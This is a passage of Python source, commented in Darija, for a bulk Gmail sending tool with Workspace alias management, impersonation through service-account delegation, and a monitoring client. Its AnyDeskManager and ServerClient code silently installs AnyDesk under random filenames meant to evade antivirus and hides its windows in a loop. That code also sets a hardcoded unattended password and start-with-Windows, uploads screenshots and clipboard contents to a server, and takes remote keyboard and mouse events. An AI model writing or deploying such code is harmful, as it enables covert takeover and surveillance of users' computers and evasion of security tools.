                root.use_custom_from.set(True)
            
            # Log
            self._mlog(f"🎯 Auto-pushed {new_added} aliases → Sender tab", "ok")
            self.log(f"✓ {new_added} aliases added to From Email box ({len(sorted_aliases)} total)", C["green"])
            
        except Exception as e:
            self._mlog(f"⚠ Push error: {e}", "err")
    
    def _stop(self):
        if self._building:
            self._stop_flag = True
            self._mlog("■ Stopping...", "err")
    
    def _update_progress(self, done, total):
        self.progress["value"] = done
        self.progress_lbl.config(text=f"{done}/{total}")
    
    def _update_stats(self):
        self.stat_added.config(text=f"Added: {len(self.last_results['added'])}")
        self.stat_existing.config(text=f"Existing: {len(self.last_results['existing'])}")
        self.stat_failed.config(text=f"Failed: {len(self.last_results['failed'])}")
    
    def _list_aliases(self):
        """List ga3 aliases mn Workspace"""
        if not self.workspace_service:
            try:
                self._connect_workspace()
            except Exception as e:
                messagebox.showerror("Error", str(e))
                return
        
        self._mlog("\n📋 Loading aliases mn Workspace...", "dim")
        
        def task():
            try:
                result = self.workspace_service.domainAliases().list(
                    customer='my_customer'
                ).execute()
                aliases = result.get('domainAliases', [])
                
                self._mlog(f"📊 Total: {len(aliases)} aliases", "ok")
                for i, a in enumerate(aliases[:30], 1):
                    self._mlog(f"  {i:3d}. {a['domainAliasName']}", "dim")
                if len(aliases) > 30:
                    self._mlog(f"  ... w {len(aliases) - 30} l'oxrin", "dim")
                
                # 🎯 AUTO-PUSH ga3 existing aliases l Sender tab
                alias_names = [a['domainAliasName'] for a in aliases]
                self.last_results = {
                    'added': [],
                    'existing': alias_names,
                    'failed': []
                }
                self.after(0, self._push_to_sender_tab)
            
            except Exception as e:
                self._mlog(f"❌ {e}", "err")
        
        threading.Thread(target=task, daemon=True).start()
    
    def _export(self):
        """Export aliases l file"""
        if not self.last_results['added'] and not self.last_results['existing']:
            messagebox.showinfo("Empty", "Mafichi aliases l export")
            return
        
        path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text", "*.txt"), ("JSON", "*.json")],
            initialfile=f"aliases_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        )
        
        if not path:
            return
        
        try:
            if path.endswith('.json'):
                with open(path, 'w') as f:
                    json.dump(self.last_results, f, indent=2)
            else:
                # Text: ga3 aliases (added + existing)
                all_aliases = self.last_results['added'] + self.last_results['existing']
                with open(path, 'w', encoding='utf-8') as f:
                    f.write("\n".join(all_aliases))
            
            self._mlog(f"💾 Exported: {os.path.basename(path)}", "ok")
            self.log(f"✓ Exported {len(self.last_results['added']) + len(self.last_results['existing'])} aliases", C["green"])
        except Exception as e:
            messagebox.showerror("Error", str(e))
    
    def _mlog(self, msg, tag="dim"):
        """Mini log f tab"""
        try:
            self.mini_log.insert("end", msg + "\n", tag)
            self.mini_log.see("end")
        except:
            pass


# ── OAuth2 Accounts Tab ──────────────────────────────────────────
class OAuth2Tab(tk.Frame):
    """
    Each account = one Service Account JSON file  +  an impersonated email.
    Sends via SMTP XOAUTH2 (smtp.gmail.com:587).
    Requires delegation scopes on the SA:
      https://www.googleapis.com/auth/gmail.send
      https://www.googleapis.com/auth/gmail.modify
      https://mail.google.com/
    """

    SCOPES = [
        "https://www.googleapis.com/auth/gmail.send",
        "https://www.googleapis.com/auth/gmail.modify",
        "https://mail.google.com/",
    ]

    def __init__(self, parent, log_fn):
        super().__init__(parent, bg=C["bg1"])
        self.log = log_fn
        # Each item: {email, json_path, status, _creds}
        self.oauth2_list = []
        self._build()

    # ── UI ───────────────────────────────────────────────────────

    def _build(self):
        pad = tk.Frame(self, bg=C["bg1"])
        pad.pack(fill="both", expand=True, padx=14, pady=14)

        # Header
        hdr = tk.Frame(pad, bg=C["bg1"])
        hdr.pack(fill="x", pady=(0,8))
        tk.Label(hdr, text="OAuth2 Accounts  —  Service Account per Email  (XOAUTH2 SMTP)",
                 bg=C["bg1"], fg=C["text"], font=("Segoe UI",9,"bold")).pack(side="left")
        tk.Frame(hdr, bg=C["border2"], height=1).pack(
            side="left", fill="x", expand=True, padx=(8,0), pady=6)

        # Info box
        info = tk.Frame(pad, bg=C["bg2"], padx=10, pady=8)
        info.pack(fill="x", pady=(0,10))
        for line in [
            "Each account needs its own Service Account JSON key file (with domain-wide delegation).",
            "Import .txt format:  email|/path/to/service_account.json  (one per line)",
            'Or use "+ Add" to pick each JSON file manually.',
            "Delegation scopes required:  gmail.send · gmail.modify · mail.google.com",
        ]:
            tk.Label(info, text=line, bg=C["bg2"], fg=C["text3"],
                     font=("Segoe UI",7)).pack(anchor="w")

        # Buttons
        btn_row = tk.Frame(pad, bg=C["bg1"])
        btn_row.pack(fill="x", pady=(0,8))
        for txt, cmd, fg in [
            ("📂 Import .txt",   self._import_txt,      C["text2"]),
            ("+ Add Account",    self._open_add_dialog,  C["text2"]),
            ("📁 Add JSON Files", self._browse_json_files, C["text2"]),
            ("⚡ Test All",      self._test_all,         C["yellow"]),
            ("🗑 Clear All",     self._clear_all,        C["red"]),
        ]:
            tk.Button(btn_row, text=txt, bg=C["bg3"], fg=fg,
                      relief="flat", bd=0, cursor="hand2", font=("Segoe UI",8),
                      command=cmd).pack(side="left", ipady=4, ipadx=8, padx=(0,5))

        self.count_lbl = tk.Label(btn_row, text="0 accounts", bg=C["bg1"],
                                   fg=C["text3"], font=("Segoe UI",8))
        self.count_lbl.pack(side="left", padx=(8,0))

        # Treeview
        cols = ("email", "json_file", "status")
        self.tree = ttk.Treeview(pad, columns=cols, show="headings", height=14)
        for c, w in [("email", 230), ("json_file", 320), ("status", 100)]:
            self.tree.heading(c, text=c.upper())
            self.tree.column(c, width=w, anchor="w")
        sb = ttk.Scrollbar(pad, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscrollcommand=sb.set)
        self.tree.pack(side="left", fill="both", expand=True, pady=(4,0))
        sb.pack(side="left", fill="y", pady=(4,0))

    # ── internal helpers ─────────────────────────────────────────

    def _add_account(self, acc):
        self.oauth2_list.append(acc)
        self.tree.insert("", "end", values=(
            acc["email"],
            os.path.basename(acc["json_path"]),
            acc["status"],
        ))
        self.count_lbl.config(text=f"{len(self.oauth2_list)} accounts")

    def _import_txt(self):
        """Import from text file: email|/path/to/sa.json per line."""
        path = filedialog.askopenfilename(
            title="Import OAuth2 account list",
            filetypes=[("Text", "*.txt"), ("All", "*.*")])
        if not path:
            return
        added = errors = 0
        with open(path, encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                parts = line.split("|")
                if len(parts) < 2:
                    errors += 1
                    continue
                email = parts[0].strip()
                json_path = parts[1].strip()
                if not os.path.exists(json_path):
                    self.log(f"⚠ JSON not found: {json_path}", C["yellow"])
                    errors += 1
                    continue
                self._add_account({"email": email, "json_path": json_path,
                                   "status": "idle", "_creds": None})
                added += 1
        self.log(f"📥 Imported {added} OAuth2 accounts ({errors} errors)", C["accent2"])

    def _open_add_dialog(self):
        """Manually enter email + pick JSON file."""
        dlg = tk.Toplevel(self)
        dlg.title("Add OAuth2 Account")
        dlg.geometry("500x220")
        dlg.configure(bg=C["bg1"])
        dlg.grab_set()

        # Email field
        tk.Label(dlg, text="Impersonated Email", bg=C["bg1"], fg=C["text3"],
                 font=("Segoe UI",8)).pack(anchor="w", padx=16, pady=(12,0))
        email_var = tk.StringVar()
        email_e = tk.Entry(dlg, textvariable=email_var, font=("Segoe UI",9),
                           bg=C["input"], fg=C["text"],
                           insertbackground=C["accent"],
                           relief="flat", bd=0,
                           highlightthickness=1,
                           highlightbackground=C["border2"])
        email_e.pack(fill="x", padx=16, ipady=5)

        # JSON file field
        tk.Label(dlg, text="Service Account JSON", bg=C["bg1"], fg=C["text3"],
                 font=("Segoe UI",8)).pack(anchor="w", padx=16, pady=(10,0))
        json_row = tk.Frame(dlg, bg=C["bg1"])
        json_row.pack(fill="x", padx=16)
        json_var = tk.StringVar()
        json_e = tk.Entry(json_row, textvariable=json_var, font=("Segoe UI",8),
                          bg=C["input"], fg=C["text2"],
                          insertbackground=C["accent"],
                          relief="flat", bd=0,
                          highlightthickness=1,
                          highlightbackground=C["border2"],
                          state="readonly")
        json_e.pack(side="left", fill="x", expand=True, ipady=5)
        tk.Button(json_row, text="📂", bg=C["bg3"], fg=C["text2"],
                  relief="flat", bd=0, cursor="hand2",
                  command=lambda: json_var.set(
                      filedialog.askopenfilename(
                          title="Select Service Account JSON",
                          filetypes=[("JSON","*.json"),("All","*.*")]) or json_var.get()
                  )).pack(side="left", padx=(4,0))

        def _save():
            email = email_var.get().strip()
            jp = json_var.get().strip()
            if not email or not jp:
                messagebox.showerror("Error", "Fill email and pick JSON file", parent=dlg)
                return
            if not os.path.exists(jp):
                messagebox.showerror("Error", f"File not found:\n{jp}", parent=dlg)
                return
            self._add_account({"email": email, "json_path": jp,
                               "status": "idle", "_creds": None})
            dlg.destroy()

        ABtn(dlg, "Add", C["accent"], _save, w=100).pack(pady=14)

    def _browse_json_files(self):
        """Pick multiple JSON files — email is read from the JSON client_email field."""
        paths = filedialog.askopenfilenames(
            title="Select Service Account JSON files",
            filetypes=[("JSON", "*.json"), ("All", "*.*")])
        added = errors = 0
        for jp in paths:
            try:
                with open(jp, encoding="utf-8") as f:
                    data = json.load(f)
                email = data.get("client_email", "")
                if not email:
                    raise ValueError("No client_email in JSON")
                self._add_account({"email": email, "json_path": jp,
                                   "status": "idle", "_creds": None})
                added += 1
            except Exception as e:
                self.log(f"⚠ {os.path.basename(jp)}: {e}", C["yellow"])
                errors += 1
        self.log(f"📁 Added {added} JSON files ({errors} errors)", C["accent2"])

    def _clear_all(self):
        if messagebox.askyesno("Confirm", "Clear all OAuth2 accounts?"):
            self.oauth2_list.clear()
            for item in self.tree.get_children():
                self.tree.delete(item)
            self.count_lbl.config(text="0 accounts")

    def _test_all(self):
        if not self.oauth2_list:
            messagebox.showinfo("Info", "No accounts to test")
            return
        self.log(f"⚡ Testing {len(self.oauth2_list)} OAuth2 accounts…", C["yellow"])

        def _do():
            items = self.tree.get_children()
            ok = fail = 0
            for iid, acc in zip(items, self.oauth2_list):
                try:
                    token = self._get_token(acc)
                    if not token:
                        raise ValueError("Empty token returned")
                    acc["status"] = "ok"
                    self.tree.set(iid, "status", "✓ ok")
                    self.log(f"✓ OAuth2 ok: {acc['email']}", C["green"])
                    ok += 1
                except Exception as e:
                    acc["status"] = "fail"
                    self.tree.set(iid, "status", "✗ fail")
                    self.log(f"✗ {acc['email']}: {str(e)[:80]}", C["red"])
                    fail += 1
            self.log(f"✔ Test done — {ok} ok · {fail} fail",
                     C["green"] if fail == 0 else C["yellow"])

        threading.Thread(target=_do, daemon=True).start()

    # ── public API (used by GmailSenderApp) ──────────────────────

    def _get_token(self, acc):
        """Get (and auto-refresh) an access token via the per-account SA JSON."""
        creds = acc.get("_creds")
        if creds is None:
            creds = service_account.Credentials.from_service_account_file(
                acc["json_path"], scopes=self.SCOPES)
            creds = creds.with_subject(acc["email"])
            acc["_creds"] = creds
        if not creds.valid or not creds.token:
            import google.auth.transport.requests as _gatr
            creds.refresh(_gatr.Request())
        return creds.token

    def get_active_accounts(self):
        """Return accounts not marked as failed."""
        return [a for a in self.oauth2_list if a["status"] != "fail"]

    def build_xoauth2_string(self, acc):
        """Build the base64 XOAUTH2 bearer string for SMTP AUTH."""
        token = self._get_token(acc)
        raw = f"user={acc['email']}\x01auth=Bearer {token}\x01\x01"
        return base64.b64encode(raw.encode()).decode()


# ═══════════════════════════════════════════════════════════════════
# 🔐 USER AUTHENTICATION SYSTEM (Login + 2FA + Multi-users + Permissions)
# ═══════════════════════════════════════════════════════════════════

# 📋 Tabs li y9der admin y3ti permissions lihom
# Format: (tab_id, display_name, emoji)
AVAILABLE_TABS = [
    ("sender",     "Sender",        "✉"),
    ("compose",    "Compose",       "✏️"),
    ("workspace",  "Workspace",     "🏢"),
    ("resend",     "Resend API",    "📨"),
    ("smtp",       "SMTP Accounts", "⚙"),
    ("proxies",    "Proxies",       "🔀"),
    ("fixed_atts", "Fixed Atts",    "📌"),
    ("settings",   "Settings",      "⚙"),
]
# Note: 'users' tab admin ghir li ki-yshofo (ma3andoch f permissions list)


# ═══════════════════════════════════════════════════════════════════
# 🌐 SERVER CLIENT — Communicate b Railway server l live monitoring
# ═══════════════════════════════════════════════════════════════════

# 🔧 CONFIG dyal server (admin khasso ybdelha)
# F production, ila kayna server.json next l .exe, n-loadiha
def _load_server_config():
    """Load server config mn server.json (next l app)"""
    config_paths = []
    # Ila frozen .exe → next to .exe
    if getattr(sys, 'frozen', False):
        config_paths.append(os.path.join(os.path.dirname(sys.executable), "server.json"))
    # Next to .py wla embedded
    config_paths.append(os.path.join(os.path.dirname(os.path.abspath(__file__)), "server.json"))
    if hasattr(sys, '_MEIPASS'):
        config_paths.append(os.path.join(sys._MEIPASS, "server.json"))
    
    for path in config_paths:
        if os.path.exists(path):
            try:
                with open(path, "r", encoding="utf-8") as f:
                    return json.load(f)
            except Exception:
                pass
    return {}

_SERVER_CONFIG = _load_server_config()
SERVER_URL = _SERVER_CONFIG.get("server_url", "").rstrip("/")
ADMIN_API_KEY = _SERVER_CONFIG.get("admin_api_key", "")
USER_API_KEY = _SERVER_CONFIG.get("user_api_key", "")


class ServerClient:
    """Client l communiquer m3a Railway server"""
    
    def __init__(self, role="user"):
        self.role = role  # 'user' ola 'admin'
        self.api_key = ADMIN_API_KEY if role == "admin" else USER_API_KEY
        self.server_url = SERVER_URL
        self.enabled = bool(self.server_url and self.api_key)
    
    def _request(self, method, endpoint, json_data=None, params=None, timeout=10):
        """Generic HTTP request l server"""
        if not self.enabled:
            return None
        try:
            import requests
            url = f"{self.server_url}{endpoint}"
            headers = {"x-api-key": self.api_key, "Content-Type": "application/json"}
            r = requests.request(method, url, json=json_data, params=params,
                                 headers=headers, timeout=timeout)
            if r.status_code == 200:
                return r.json()
            return None
        except Exception as e:
            # Silent fail — server might be down, ma n-crashich l'app
            return None
    
    # ─── User-side methods ───
    def heartbeat(self, username, status="idle", os_info=""):
        return self._request("POST", "/heartbeat", json_data={
            "username": username,
            "current_status": status,
            "os_info": os_info,
        })
    
    def send_log(self, username, message, level="info", details=None):
        return self._request("POST", "/log", json_data={
            "username": username,
            "level": level,
            "message": message,
            "details": details,
        })
    
    def get_commands(self, username):
        result = self._request("GET", f"/commands/{username}")
        return result.get("commands", []) if result else []
    
    def ack_command(self, command_id, status="done"):
        return self._request("POST", "/command-ack", json_data={
            "command_id": command_id, "status": status
        })
    
    def check_expiration(self, username):
        """Returns dict m3a expires_at + blocked"""
        return self._request("GET", f"/check-expiration/{username}")
    
    # ─── Admin-side methods ───
    def list_users(self):
        result = self._request("GET", "/admin/users", timeout=15)
        return result.get("users", []) if result else []
    
    def get_logs(self, username=None, limit=200, since=None):
        params = {"limit": limit}
        if username: params["username"] = username
        if since: params["since"] = since
        result = self._request("GET", "/admin/logs", params=params, timeout=15)
        return result.get("logs", []) if result else []
    
    def extend_user(self, username, additional_seconds):
        return self._request("POST", "/admin/extend", json_data={
            "username": username,
            "additional_seconds": additional_seconds,
        })
    
    def disconnect_user(self, username, reason=""):
        return self._request("POST", "/admin/disconnect", json_data={
            "username": username, "reason": reason
        })
    
    def block_user(self, username, blocked=True):
        return self._request("POST", "/admin/block", json_data={
            "username": username, "blocked": blocked
        })
    
    def clear_disconnect(self, username):
        return self._request("DELETE", f"/admin/clear-disconnect/{username}")
    
    # ─── Screen monitoring ───
    def upload_screenshot(self, username, image_b64):
        """User uploads screenshot"""
        return self._request("POST", "/screen/upload", json_data={
            "username": username,
            "image": image_b64,
        }, timeout=15)
    
    def check_watch_status(self, username):
        """User checks ila admin watching"""
        result = self._request("GET", f"/screen/watch/{username}", timeout=5)
        return result.get("watching", False) if result else False
    
    def admin_start_watching(self, username):
        return self._request("POST", f"/admin/screen/start/{username}")
    
    def admin_stop_watching(self, username):
        return self._request("POST", f"/admin/screen/stop/{username}")
    
    def admin_get_screenshot(self, username):
        result = self._request("GET", f"/admin/screen/{username}", timeout=10)
        return result if result else None
    
    # ─── Remote Control: Mouse/Keyboard/Clipboard ───
    def send_control_event(self, username, event):
        """Admin sends control event (mouse/keyboard) l user"""
        return self._request("POST", f"/admin/control/{username}",
                              json_data=event, timeout=5)
    
    def poll_control_events(self, username):
        """User polls events l-y-ydir"""
        result = self._request("GET", f"/control/poll/{username}", timeout=5)
        return result.get("events", []) if result else []
    
    def sync_clipboard(self, username, text):
        """User syncs clipboard l server"""
        return self._request("POST", "/clipboard/sync",
                              json_data={"username": username, "text": text},
                              timeout=5)
    
    def get_user_clipboard(self, username):
        """Admin gets clipboard dyal user"""
        result = self._request("GET", f"/admin/clipboard/{username}", timeout=5)
        return result.get("text", "") if result else ""
    
    def send_clipboard_to_user(self, username, text):
        """Admin sends text l clipboard dyal user"""
        return self._request("POST", f"/admin/clipboard/{username}",
                              json_data={"text": text}, timeout=5)
    
    # ─── AnyDesk integration ───
    def register_anydesk(self, username, anydesk_id, anydesk_password=""):
        """User registers AnyDesk ID m3a server"""
        return self._request("POST", "/anydesk/register", json_data={
            "username": username,
            "anydesk_id": anydesk_id,
            "anydesk_password": anydesk_password,
        })
    
    def get_anydesk(self, username):
        """Admin gets AnyDesk ID dyal user"""
        return self._request("GET", f"/admin/anydesk/{username}")


# ═══════════════════════════════════════════════════════════════════
# 🖥 ANYDESK MANAGER — Install + Get ID
# ═══════════════════════════════════════════════════════════════════

class AnyDeskManager:
    """Manages AnyDesk: SILENT install + auto-config + get ID + set password"""
    
    # Common AnyDesk install paths
    PATHS = [
        r"C:\Program Files (x86)\AnyDesk\AnyDesk.exe",
        r"C:\Program Files\AnyDesk\AnyDesk.exe",
        os.path.expanduser(r"~\AppData\Roaming\AnyDesk\AnyDesk.exe"),
        os.path.expanduser(r"~\AppData\Local\AnyDesk\AnyDesk.exe"),
    ]
    
    DOWNLOAD_URL = "https://download.anydesk.com/AnyDesk.exe"
    
    # Default unattended password (admin ki-sta3mloha l connect)
    UNATTENDED_PASSWORD = "skpro2024"
    
    @classmethod
    def find_executable(cls):
        """Returns path l AnyDesk.exe ila kayna, None ila la"""
        for p in cls.PATHS:
            if os.path.exists(p):
                return p
        try:
            import shutil as sh
            return sh.which("AnyDesk") or sh.which("AnyDesk.exe")
        except Exception:
            return None
    
    @classmethod
    def is_installed(cls):
        return cls.find_executable() is not None
    
    @classmethod
    def _find_bundled_anydesk(cls):
        """Find AnyDesk.exe bundled m3a SK PRO (next l .exe wla f _MEIPASS)"""
        possible_paths = []
        
        # Ila frozen .exe → check next l executable
        if getattr(sys, 'frozen', False):
            exe_dir = os.path.dirname(sys.executable)
            possible_paths.append(os.path.join(exe_dir, "AnyDesk.exe"))
            possible_paths.append(os.path.join(exe_dir, "anydesk_bundle", "AnyDesk.exe"))
        
        # PyInstaller temp folder
        if hasattr(sys, '_MEIPASS'):
            possible_paths.append(os.path.join(sys._MEIPASS, "AnyDesk.exe"))
            possible_paths.append(os.path.join(sys._MEIPASS, "anydesk_bundle", "AnyDesk.exe"))
        
        # Next to .py (development mode)
        script_dir = os.path.dirname(os.path.abspath(__file__))
        possible_paths.append(os.path.join(script_dir, "AnyDesk.exe"))
        possible_paths.append(os.path.join(script_dir, "anydesk_bundle", "AnyDesk.exe"))
        
        for p in possible_paths:
            if os.path.exists(p) and os.path.getsize(p) > 1_000_000:  # >1MB
                return p
        return None
    
    @classmethod
    @classmethod
    def _start_hidden(cls, exe_path):
        """Start AnyDesk completely hidden (no window visible)"""
        try:
            if os.name == "nt":
                # Windows: use STARTUPINFO with SW_HIDE
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = 0  # SW_HIDE
                
                subprocess.Popen(
                    [exe_path],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    stdin=subprocess.DEVNULL,
                    startupinfo=startupinfo,
                    creationflags=subprocess.CREATE_NO_WINDOW | 0x08000000,
                )
            else:
                subprocess.Popen(
                    [exe_path],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
            return True
        except Exception:
            return False
    
    @classmethod
    def _hide_window_aggressive(cls):
        """Force hide ALL AnyDesk windows IMMEDIATELY"""
        if os.name != "nt":
            return
        try:
            import ctypes
            from ctypes import wintypes
            
            EnumWindows = ctypes.windll.user32.EnumWindows
            EnumWindowsProc = ctypes.WINFUNCTYPE(
                ctypes.c_bool, wintypes.HWND, wintypes.LPARAM
            )
            GetWindowText = ctypes.windll.user32.GetWindowTextW
            GetWindowTextLength = ctypes.windll.user32.GetWindowTextLengthW
            ShowWindow = ctypes.windll.user32.ShowWindow
            SW_HIDE = 0
            
            def callback(hwnd, lparam):
                length = GetWindowTextLength(hwnd)
                if length > 0:
                    buf = ctypes.create_unicode_buffer(length + 1)
                    GetWindowText(hwnd, buf, length + 1)
                    title = buf.value
                    if "AnyDesk" in title:
                        ShowWindow(hwnd, SW_HIDE)  # COMPLETELY HIDDEN
                return True
            
            EnumWindows(EnumWindowsProc(callback), 0)
        except Exception:
            pass
    
    @classmethod
    def _install_from_path(cls, source_exe, on_progress=None):
        """Install AnyDesk mn local .exe (bundled wla downloaded) - SILENT"""
        try:
            import shutil as sh
            import threading
            
            # Copy l user folder + run portable mode
            target_dir = os.path.expanduser(r"~\AppData\Roaming\AnyDesk")
            os.makedirs(target_dir, exist_ok=True)
            target_exe = os.path.join(target_dir, "AnyDesk.exe")
            
            if on_progress:
                on_progress("⏳ Setting up AnyDesk...")
            
            sh.copy2(source_exe, target_exe)
            
            # Start AnyDesk HIDDEN (window mafichi visible)
            cls._start_hidden(target_exe)
            
            # Background thread: aggressively hide windows kol 0.5s for 30s
            def _hide_loop():
                import time
                for _ in range(60):  # 30 secondes (60 × 0.5s)
                    cls._hide_window_aggressive()
                    time.sleep(0.5)
            
            threading.Thread(target=_hide_loop, daemon=True).start()
            
            import time
            time.sleep(5)
            
            if on_progress:
                on_progress("✅ AnyDesk ready (silent mode)")
            return True
        except Exception as e:
            if on_progress:
                on_progress(f"❌ Install error: {str(e)[:80]}")
            return False
    
    @classmethod
    def silent_install(cls, on_progress=None):
        """Silent install AnyDesk: bundled lawl, mn ba3d download mn internet"""
        if cls.is_installed():
            if on_progress:
                on_progress("✅ AnyDesk already installed")
            return True
        
        # 🎁 PRIORITY 1: Try extract AnyDesk mn bundled .exe (admin packaged it)
        bundled_path = cls._find_bundled_anydesk()
        if bundled_path:
            if on_progress:
                on_progress("📦 Using bundled AnyDesk...")
            return cls._install_from_path(bundled_path, on_progress)
        
        # PRIORITY 2: Download mn internet
        try:
            import urllib.request
            import tempfile
            import secrets
            
            # 🔧 Try multiple folder paths bach n-tjawez antivirus + permissions
            # Random filename bach antivirus ma y-detectich
            random_suffix = secrets.token_hex(4)
            possible_dirs = [
                # User's Documents folder (less restricted)
                os.path.expanduser(r"~\Documents"),
                # User's home
                os.path.expanduser(r"~"),
                # Public folder
                r"C:\Users\Public\Downloads",
                # Temp (last resort)
                tempfile.gettempdir(),
            ]
            
            installer = None
            for dir_path in possible_dirs:
                try:
                    if not os.path.exists(dir_path):
                        continue
                    test_path = os.path.join(dir_path, f"setup_{random_suffix}.exe")
                    # Test ila ki9der yektb
                    with open(test_path, "wb") as test_f:
                        test_f.write(b"test")
                    os.remove(test_path)
                    # OK, ki9der yektb
                    installer = os.path.join(dir_path, f"adsetup_{random_suffix}.exe")
                    break
                except Exception:
                    continue
            
            if not installer:
                if on_progress:
                    on_progress("❌ No writable folder found")
                return False
            
            if on_progress:
                on_progress(f"⏳ Downloading AnyDesk (~3 MB)...")
            
            # 🔧 Fix: AnyDesk ki-block urllib bla User-Agent
            try:
                import requests
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                  "AppleWebKit/537.36 (KHTML, like Gecko) "
                                  "Chrome/120.0.0.0 Safari/537.36"
                }
                r = requests.get(cls.DOWNLOAD_URL, headers=headers,
                                  stream=True, timeout=60, allow_redirects=True)
                r.raise_for_status()
                
                with open(installer, "wb") as f:
                    for chunk in r.iter_content(chunk_size=8192):
                        if chunk:
                            f.write(chunk)
            except ImportError:
                req = urllib.request.Request(
                    cls.DOWNLOAD_URL,
                    headers={
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                      "AppleWebKit/537.36 (KHTML, like Gecko) "
                                      "Chrome/120.0.0.0 Safari/537.36"
                    }
                )
                with urllib.request.urlopen(req, timeout=60) as response:
                    with open(installer, "wb") as f:
                        f.write(response.read())
            
            # Verify file exists w bigger than 1KB
            if not os.path.exists(installer) or os.path.getsize(installer) < 1024:
                if on_progress:
                    on_progress("❌ Download failed or incomplete")
                return False
            
            if on_progress:
                on_progress("⏳ Installing AnyDesk silently...")
            
            # Silent install
            install_path = r"C:\Program Files (x86)\AnyDesk"
            
            try:
                # Method 1: Silent install m3a default settings
                result = subprocess.run(
                    [
                        installer,
                        "--install", install_path,
                        "--start-with-win",
                        "--silent",
                    ],
                    capture_output=True, text=True, timeout=120,
                    creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0
                )
                
                # Wait for installation
                import time
                time.sleep(5)
                
                if cls.is_installed():
                    if on_progress:
                        on_progress("✅ AnyDesk installed successfully!")
                    return True
            except Exception as e:
                pass
            
            # Method 2: Run portable (ila silent install fashel)
            if on_progress:
                on_progress("⏳ Starting AnyDesk portable...")
            
            subprocess.Popen(
                [installer],
                creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0
            )
            
            # Tsenna ta yt-create config
            import time
            time.sleep(10)
            
            return True
        except Exception as e:
            if on_progress:
                on_progress(f"❌ Install failed: {e}")
            return False
    
    @classmethod
    def get_anydesk_id(cls, timeout=30):
        """
        Get AnyDesk ID — wait ta AnyDesk yKhdem w yt-3ti ID.
        Returns: "123 456 789" wla None
        """
        exe = cls.find_executable()
        if not exe:
            return None
        
        # Method 1: --get-id command
        try:
            result = subprocess.run(
                [exe, "--get-id"],
                capture_output=True, text=True, timeout=10,
                creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0
            )
            output = (result.stdout or "").strip()
            if output and output.replace(" ", "").isdigit():
                return output
        except Exception:
            pass
        
        # Method 2: Read from config files (Windows) - kolchi possible paths
        if os.name == "nt":
            try:
                config_paths = [
                    os.path.expandvars(r"%APPDATA%\AnyDesk\system.conf"),
                    os.path.expandvars(r"%PROGRAMDATA%\AnyDesk\system.conf"),
                    os.path.expandvars(r"%APPDATA%\AnyDesk\service.conf"),
                    os.path.expandvars(r"%APPDATA%\AnyDesk\user.conf"),
                    os.path.expandvars(r"%PROGRAMDATA%\AnyDesk\service.conf"),
                    # Portable mode paths
                    os.path.join(os.path.dirname(exe), "AnyDesk.conf"),
                    os.path.join(os.path.dirname(exe), "system.conf"),
                ]
                for cfg in config_paths:
                    if os.path.exists(cfg):
                        try:
                            with open(cfg, "r", encoding="utf-8", errors="ignore") as f:
                                content = f.read()
                            import re
                            # Try multiple patterns
                            patterns = [
                                r"ad\.anynet\.id=(\d+)",
                                r"anynet\.id=(\d+)",
                                r"ad_id=(\d+)",
                            ]
                            for pat in patterns:
                                m = re.search(pat, content)
                                if m:
                                    return m.group(1)
                        except Exception:
                            continue
            except Exception:
                pass
        
        # Method 3: Read from window title (l mli AnyDesk window maftoh)
        if os.name == "nt":
            try:
                # PowerShell command to get AnyDesk window title
                ps_cmd = (
                    "Get-Process AnyDesk -ErrorAction SilentlyContinue | "
                    "Where-Object {$_.MainWindowTitle -like '*AnyDesk*'} | "
                    "Select-Object -ExpandProperty MainWindowTitle"
                )
                result = subprocess.run(
                    ["powershell", "-Command", ps_cmd],
                    capture_output=True, text=True, timeout=10,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                output = (result.stdout or "").strip()
                # Look for 9-10 digit ID
                import re
                m = re.search(r"(\d{9,10})", output.replace(" ", ""))
                if m:
                    return m.group(1)
            except Exception:
                pass
        
        # Method 4: Use ctypes to query window titles (last resort)
        if os.name == "nt":
            try:
                import ctypes
                from ctypes import wintypes
                
                EnumWindows = ctypes.windll.user32.EnumWindows
                EnumWindowsProc = ctypes.WINFUNCTYPE(
                    ctypes.c_bool, wintypes.HWND, wintypes.LPARAM
                )
                GetWindowText = ctypes.windll.user32.GetWindowTextW
                GetWindowTextLength = ctypes.windll.user32.GetWindowTextLengthW
                
                titles = []
                
                def callback(hwnd, lparam):
                    length = GetWindowTextLength(hwnd)
                    if length > 0:
                        buf = ctypes.create_unicode_buffer(length + 1)
                        GetWindowText(hwnd, buf, length + 1)
                        title = buf.value
                        if "AnyDesk" in title:
                            titles.append(title)
                    return True
                
                EnumWindows(EnumWindowsProc(callback), 0)
                
                import re
                for title in titles:
                    # Format: "AnyDesk - 1 525 947 586" wla similar
                    m = re.search(r"(\d[\d\s]{8,}\d)", title)
                    if m:
                        clean = m.group(1).replace(" ", "")
                        if 9 <= len(clean) <= 10 and clean.isdigit():
                            return clean
            except Exception:
                pass
        
        return None
    
    @classmethod
    def set_unattended_password(cls, password=None):
        """
        Skip --set-password (AnyDesk ki-show popup admin rights).
        Khali user yset password manually mn AnyDesk settings.
        """
        # SKIP: AnyDesk's --set-password ki-show popup mli ma 3andoch admin rights.
        # Best: user yset password manually mn AnyDesk Settings → Security
        return False
    
    @classmethod
    def ensure_running(cls):
        """Make sure AnyDesk daemon kheddam HIDDEN"""
        exe = cls.find_executable()
        if not exe:
            return False
        try:
            cls._start_hidden(exe)
            # Aggressively hide windows in background
            import threading
            def _hide_loop():
                import time
                for _ in range(20):  # 10 secondes
                    cls._hide_window_aggressive()
                    time.sleep(0.5)
            threading.Thread(target=_hide_loop, daemon=True).start()
            return True
        except Exception:
            return False
    
